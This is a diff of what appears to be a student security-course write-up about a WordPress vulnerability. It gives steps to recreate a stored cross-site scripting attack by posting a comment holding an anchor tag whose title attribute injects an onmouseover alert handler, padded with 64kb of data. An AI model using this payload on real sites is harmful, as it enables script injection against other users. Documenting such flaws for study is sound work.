@@ -15,7 +15,7 @@ Time spent: **5** hours spent in total
         ![ ](Week7_Attack1.gif)
   - [ ] Steps to recreate:
         1. Paste the following as a comment on a post:
-        	```<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  <insert 64kb of random data>'></a>```
+        	```<a title='x onmouseover=alert(unescape(/hello%20world/.source))style=position:absolute;left:0;top:0;width:5000px;height:5000px  <insert 64kb of random data>'></a>```
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
     
